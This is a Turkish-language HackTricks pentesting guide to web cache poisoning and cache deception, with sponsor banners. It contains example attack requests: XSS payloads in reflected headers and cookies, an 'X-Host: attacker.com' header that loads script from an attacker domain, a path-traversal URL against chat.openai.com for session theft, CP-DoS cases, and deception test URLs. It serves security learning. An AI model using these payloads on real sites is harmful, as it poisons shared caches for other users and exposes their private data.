# Önbellek Zehirlenmesi ve Önbellek Aldatmacası

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünleri**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=cache-deception) kullanarak dünyanın **en gelişmiş topluluk araçları** tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=cache-deception" %}

## Fark

> **Web önbellek zehirlenmesi ile web önbellek aldatmacası arasındaki fark nedir?**
>
> * **Web önbellek zehirlenmesinde**, saldırgan uygulamayı önbelleğe bazı kötü amaçlı içerikler depolamaya zorlar ve bu içerik önbellekten diğer uygulama kullanıcılarına sunulur.
> * **Web önbellek aldatmacasında**, saldırgan uygulamayı başka bir kullanıcıya ait hassas içerikleri önbelleğe depolamaya zorlar ve ardından bu içeriği önbellekten alır.

## Önbellek Zehirlenmesi

Önbellek zehirlenmesi, istemci tarafı önbelleğini manipüle etmeyi amaçlayarak istemcileri beklenmeyen, kısmi veya saldırganın kontrolü altındaki kaynakları yüklemeye zorlar. Etki derecesi, etkilenen sayfanın popülerliğine bağlıdır, çünkü kirletilmiş yanıt, önbelleğin kirletilme süresi boyunca sayfayı ziyaret eden kullanıcılara özel olarak sunulur.

Önbellek zehirlenmesi saldırısının gerçekleştirilmesi birkaç adımı içerir:

1. **Anahtarlanmamış Girişlerin Tanımlanması**: Bu, önbelleğe alınması için gerekli olmasa da, sunucu tarafından döndürülen yanıtı değiştirebilen parametrelerdir. Bu girişlerin tanımlanması, önbelleği manipüle etmek için söz konusu girişlerin nasıl kötüye kullanılacağının belirlenmesi açısından önemlidir.
2. **Anahtarlanmamış Girişlerin Kötüye Kullanılması**: Anahtarlanmamış girişleri tanımladıktan sonra, bir sonraki adım, bu parametreleri nasıl kötüye kullanarak sunucunun yanıtını saldırganın lehine nasıl değiştireceğini bulmaktır.
3. **Zehirli Yanıtın Önbelleğe Alınmasının Sağlanması**: Son adım, manipüle edilmiş yanıtın önbelleğe alındığından emin olmaktır. Bu şekilde, önbelleğin zehirlendiği süre zarfında etkilenen sayfaya erişen herhangi bir kullanıcı kirletilmiş yanıtı alacaktır.

### Keşif: HTTP başlıklarını kontrol edin

Genellikle bir yanıtın **önbelleğe alındığında buna işaret eden bir başlık** olacaktır, bu başlıklara dikkat etmeniz gereken hangi başlıklar olduğunu bu yazıda kontrol edebilirsiniz: [**HTTP Önbellek başlıkları**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Keşif: Önbellek hata kodlarını kontrol edin

Eğer yanıtın önbelleğe alındığını düşünüyorsanız, **kötü bir başlıkla istek göndermeyi** deneyebilirsiniz, bu durumda bir **durum kodu 400** ile yanıt verilmesi gerekmektedir. Daha sonra isteği normal olarak erişmeye çalışın ve yanıtın **400 durum kodu** olup olmadığını kontrol edin, eğer öyleyse zayıf olduğunu biliyorsunuzdur (ve hatta bir DoS gerçekleştirebilirsiniz).

Daha fazla seçenek bulabilirsiniz:

{% content-ref url="cache-poisoning-to-dos.md" %}
[cache-poisoning-to-dos.md](cache-poisoning-to-dos.md)
{% endcontent-ref %}

Ancak, **bazen bu tür durum kodları önbelleğe alınmaz** bu nedenle bu test güvenilir olmayabilir.

### Keşif: Anahtarlanmamış girişleri tanımlayın ve değerlendirin

[**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) kullanarak sayfanın yanıtını değiştirebilecek parametreleri ve başlıkları **brute-force** yöntemiyle bulabilirsiniz. Örneğin, bir sayfa, betiği oradan yüklemesi için istemciyi göstermek için `X-Forwarded-For` başlığını kullanıyor olabilir:
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Zararlı bir yanıtı arka uç sunucudan çıkarın

Parametre/başlık belirlendikten sonra, nasıl **temizlendiğini** ve nerede yansıtıldığını veya yanıtı nasıl etkilediğini kontrol edin. Herhangi bir şekilde kötüye kullanabilir misiniz (XSS gerçekleştirebilir veya sizin kontrolünüzdeki bir JS kodu yükleyebilir misiniz? DoS gerçekleştirebilir misiniz?...)

### Yanıtı önbelleğe alın

Kötüye kullanılabilecek **sayfayı** belirledikten sonra, hangi **parametre**/**başlık**'ı kullanacağınızı ve nasıl **kötüye kullanacağınızı** belirledikten sonra, sayfayı önbelleğe almanız gerekmektedir. Önbelleğe alınmaya çalışılan kaynağa bağlı olarak, bu biraz zaman alabilir, birkaç saniye boyunca denemek zorunda kalabilirsiniz.\
Yanıtta **`X-Cache`** başlığı, isteğin önbelleğe alınmadığında **`miss`** değerine sahip olabileceği ve önbelleğe alındığında **`hit`** değerine sahip olabileceği için çok yararlı olabilir.\
**`Cache-Control`** başlığı da ilginçtir; bir kaynağın önbelleğe alınıp alınmadığını ve kaynağın bir sonraki sefer ne zaman tekrar önbelleğe alınacağını bilmek için kullanışlıdır: `Cache-Control: public, max-age=1800`\
Başka bir ilginç başlık ise **`Vary`**. Bu başlık genellikle önbellek anahtarı olarak işlenen normalde anahtar olmayan ek başlıkları belirtmek için kullanılır. Bu nedenle, kullanıcı, hedef aldığı kurbanın `User-Agent`'ını biliyorsa, belirli `User-Agent`'ı kullanan kullanıcılar için önbelleği zehirleyebilir.\
Önbellekle ilgili bir başka başlık ise **`Age`**. Bu, nesnenin proxy önbelleğinde kaç saniye boyunca olduğunu tanımlar.

Bir isteği önbelleğe alırken, kullanılan başlıklara **dikkat edin** çünkü bunlardan bazıları beklenmedik şekilde **anahtar** olarak kullanılabilir ve **kurbanın aynı başlığı kullanması gerekebilir**. Her zaman **farklı tarayıcılar** kullanarak bir Önbellek Zehirlenmesini **test edin** ve çalışıp çalışmadığını kontrol edin.

## Sömürü Örnekleri

### En basit örnek

`X-Forwarded-For` gibi bir başlık yanıtta temizlenmeden yansıtılıyor.\
Temel bir XSS yükü gönderebilir ve önbelleği zehirleyebilirsiniz, böylece sayfaya erişen herkes XSS'e maruz kalacaktır:
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Not edin ki bu `/en?region=uk` isteğini zehirleyecek, `/en` değil_

### DoS için önbellek zehirlenmesi

{% content-ref url="cache-poisoning-to-dos.md" %}
[cache-poisoning-to-dos.md](cache-poisoning-to-dos.md)
{% endcontent-ref %}

### Çerez işleme açıklarını sömürmek için web önbellek zehirlenmesi kullanma

Çerezler ayrıca bir sayfanın yanıtında yansıtılabilir. Örneğin bir XSS'e neden olmak için bunu kötüye kullanabilirseniz, kötü amaçlı önbellek yanıtını yükleyen birkaç istemcide XSS'i sömürebilirsiniz.
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
### API anahtarını çalmak için yol gezinimini kullanarak önbellek zehirlenmesi <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**Bu yazıda açıklandığı gibi**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html), `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` gibi bir URL ile bir OpenAI API anahtarının çalınabilmesinin mümkün olduğu çünkü `/share/*` ile eşleşen her şey, Cloudflare'ın URL'yi normalize etmeden önbelleğe alınacağı ve bu işlemin web sunucusuna ulaştığında gerçekleştiği anlatılmaktadır.

### Web önbellek zehirlenmesi açıklarını sömürmek için birden fazla başlık kullanma <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Bazen bir önbelleği kötüye kullanabilmek için **birkaç anahtarsız girişi sömürmeniz gerekebilir**. Örneğin, `X-Forwarded-Host`'u sizin kontrol ettiğiniz bir alan adına ve `X-Forwarded-Scheme`'i `http` olarak ayarlarsanız, bir **Açık yönlendirme** bulabilirsiniz. **Eğer** **sunucu** tüm **HTTP** isteklerini **HTTPS'ye yönlendiriyorsa** ve yönlendirme için alan adı olarak `X-Forwarded-Scheme` başlığını kullanıyorsa, yönlendirmenin nereye yapıldığını kontrol edebilirsiniz.
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Sınırlı `Vary` başlığı ile Sömürme

Eğer yanıtta **`User-Agent`**'ı gösteren **`Vary`** başlığı kullanıldığını fark ederseniz ve **`X-Host`** başlığının bir JS kaynağını yüklemek için **alan adı olarak kullanıldığını** bulursanız, kurbanın User-Agent'ını dışa çıkarmak ve bu user agent'ı kullanarak önbelleği zehirlemek için bir yol bulmanız gerekecektir:
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

GET isteği, isteği URL'de ve gövdede göndererek gönderilir. Eğer web sunucusu gövdedekini kullanıyorsa ancak önbellek sunucusu URL'dekini önbelleğe alıyorsa, o URL'ye erişen herkes aslında gövdedeki parametreyi kullanacaktır. Github web sitesinde bulunan James Kettle'ın keşfettiği zayıflık gibi.
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
### Parametre Gizleme

Örneğin, ruby sunucularda **`&`** yerine **`;`** karakterini kullanarak **parametreleri** ayırmak mümkündür. Bu, anahtarlı parametre değerlerini anahtarlı olmayanların içine yerleştirmek ve bunları kötüye kullanmak için kullanılabilir.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### HTTP Önbellek Zehirlenmesini Kötüye Kullanarak HTTP Önbellek Zehirlenmesini Sömürme

[HTTP İstek Kaçırma](../http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-poisoning) kullanarak Önbellek Zehirlenme saldırılarını nasıl gerçekleştireceğinizi buradan öğrenin.

### Web Önbellek Zehirlenmesi için Otomatik Testler

[Web Önbellek Zafiyet Tarayıcısı](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) web önbellek zehirlenmesi için otomatik testler yapmak için kullanılabilir. Birçok farklı teknik destekler ve yüksek derecede özelleştirilebilir.

Örnek kullanım: `wcvs -u example.com`



<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=cache-deception) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=cache-deception" %}



## Hassas Örnekler

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS, URL içindeki parçayı ayıklamadan iletmiş ve önbellek anahtarını yalnızca ana bilgisayar, yol ve sorgu kullanarak oluşturmuştur (parçayı yok sayarak). Bu nedenle, `/#/../?r=javascript:alert(1)` isteği backend'e `/#/../?r=javascript:alert(1)` olarak gönderilmiş ve önbellek anahtarı içinde yalnızca ana bilgisayar, yol ve sorgu bulunmuştur.

### GitHub CP-DoS

İçerik türü başlığında kötü bir değer göndermek, önbelleğe alınmış bir 405 yanıtını tetiklemiştir. Önbellek anahtarı çerez içerdiği için yalnızca kimlik doğrulaması yapılmamış kullanıcılara saldırmak mümkün olmuştur.

### GitLab + GCP CP-DoS

GitLab, statik içeriği depolamak için GCP kovalarını kullanır. **GCP Kovaları**, **`x-http-method-override`** başlığını destekler. Bu nedenle, `x-http-method-override: HEAD` başlığını göndermek ve önbelleği boş bir yanıt gövdesi döndürmek mümkün olmuştur. Ayrıca `PURGE` yöntemini de destekleyebilir.

### Rack Ara Yazılımı (Ruby on Rails)

Ruby on Rails uygulamalarında genellikle Rack ara yazılımı kullanılır. Rack kodunun amacı, **`x-forwarded-scheme`** başlığının değerini almak ve isteğin şeması olarak ayarlamaktır. `x-forwarded-scheme: http` başlığı gönderildiğinde, aynı konuma yönlendirilen bir 301 yönlendirmesi gerçekleşir, bu da o kaynağa karşı bir Hizmet Reddi (DoS) oluşturabilir. Ayrıca, uygulama `X-forwarded-host` başlığını kabul edebilir ve kullanıcıları belirtilen ana bilgisayara yönlendirebilir. Bu davranış, bir saldırganın sunucusundan JavaScript dosyalarını yüklemesine neden olabilir ve güvenlik riski oluşturabilir.

### 403 ve Depolama Kovaları

Cloudflare önceden 403 yanıtlarını önbelleğe almıştır. Yanlış Kimlik Doğrulama başlıklarıyla S3 veya Azure Depolama Bloklarına erişmeye çalışmak, önbelleğe alınan bir 403 yanıtına neden olmuştur. Cloudflare 403 yanıtlarını önbelleğe almaktan vazgeçmiş olsa da, bu davranış başka proxy hizmetlerinde hala mevcut olabilir.

### Anahtarlı Parametreler Enjekte Etme

Önbellekler genellikle özel GET parametrelerini önbellek anahtarında saklar. Örneğin, Fastly'nin Varnish'i isteklerde `size` parametresini önbelleğe almıştır. Ancak, hatalı bir değerle birlikte URL kodlanmış bir versiyonu (örneğin, `siz%65`) gönderildiğinde, önbellek anahtarı doğru `size` parametresini kullanarak oluşturulur. Ancak, backend, URL kodlanmış parametre değerini işler. İkinci `size` parametresini URL kodlamak, önbellek tarafından atlanmasına ancak backend tarafından kullanılmasına neden olmuştur. Bu parametreye 0 değeri atamak, önbelleğe alınabilir bir 400 Hatalı İstek hatası sonucunu doğurmuştur.

### Kullanıcı Ajanı Kuralları

Bazı geliştiriciler, sunucu yükünü yönetmek için FFUF veya Nuclei gibi yüksek trafikli araçların kullanıcı ajanlarıyla eşleşen istekleri engeller. İronik bir şekilde, bu yaklaşım önbellek zehirlenmesi ve Hizmet Reddi gibi güvenlik açıklarına neden olabilir.

### Yasadışı Başlık Alanları

[RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230), başlık adlarında kabul edilebilir karakterleri belirtir. Belirtilen **tchar** aralığının dışındaki karakterleri içeren başlıklar ideal olarak bir 400 Hatalı İstek yanıtı tetiklemelidir. Uygulamada sunucular her zaman bu standartlara uymazlar. Akamai gibi, geçersiz karakterler içeren başlıkları iletir ve `cache-control` başlığı mevcut olmadığı sürece herhangi bir 400 hatasını önbelleğe alır. Geçersiz bir karakter içeren bir başlık göndermenin, `\` gibi, önbelleğe alınabilir bir 400 Hatalı İstek hatası sonucunu doğurduğu bir sömürülebilir desen belirlenmiştir.

### Yeni başlıklar bulma

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Önbellek Aldatmacası

Önbellek Aldatmacasının amacı, istemcilerin **önbellekte saklanacak kaynakları hassas bilgileriyle yüklemelerini sağlamaktır**.

Öncelikle **.css**, **.js**, **.png** gibi **uzantıların** genellikle **önbelleğe kaydedilmesi** için **yapılandırıldığını** unutmayın. Bu nedenle, `www.example.com/profile.php/nonexistent.js`'ye erişirseniz, önbellek muhtemelen yanıtı saklayacaktır çünkü **.js** uzantısını görür. Ancak, **uygulama** _www.example.com/profile.php/_ içinde saklanan **hassas** kullanıcı içeriğiyle **yeniden oynuyorsa**, diğer kullanıcılardan bu içerikleri **çalabilirsiniz**.

Test edilecek diğer şeyler:

* _www.example.com/profile.php/.js_
* _www.example.com/profile.php/.css_
* _www.example.com/profile.php/test.js_
* _www.example.com/profile.php/../test.js_
* _www.example.com/profile.php/%2e%2e/test.js_
* _`.avif` gibi daha az bilinen uzantıları kullanın_

Bu yazıda çok net bir örnek bulabilirsiniz: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
Bu örnekte, _http://www.example.com/home.php/non-existent.css_ gibi mevcut olmayan bir sayfa yüklerseniz, _http://www.example.com/home.php/_ içeriği (**kullanıcının hassas bilgileriyle**) geri dönecek ve önbellek sunucusu sonucu kaydedecektir.\
Daha sonra, **saldırgan**, kendi tarayıcısında _http://www.example.com/home.php/non-existent.css_'e erişebilir ve önceden erişen kullanıcıların **gizli bilgilerini** gözlemleyebilir.

Önbellek **proxy**'sinin dosyaları **içerik türüne** göre değil, dosya uzantısına göre önbelleğe alacak şekilde **yapılandırılması gerektiğini** unutmayın (_.css_). Örneğin, _http://www.example.com/home.php/non-existent.css_ önbelleğe alınmış bir 400 Hatalı İstek hatası sonucu vermesi gereken bir `text/css` mime türü yerine `text/html` içerik türüne sahip olacaktır (beklenen _.css_ dosyası için). 

[HTTP İstek Kaçırma](../http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-deception) kullanarak[ Önbellek Aldatmacası saldırılarını nasıl gerçekleştireceğinizi buradan öğrenin.
## Otomatik Araçlar

* [**toxicache**](https://github.com/xhzeem/toxicache): Belirli URL'lerde web önbellek zehirlenmesi açıklarını bulmak ve birden fazla enjeksiyon tekniğini test etmek için Golang tarayıcı.

## Referanslar

* [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
* [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
* [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
* [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
* [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
* [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=cache-deception)'i kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen **otomatik iş akışları** oluşturun ve otomatikleştirin.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=cache-deception" %}

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) katılın veya [telegram grubuna](https://t.me/peass) katılın veya bizi Twitter'da takip edin** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
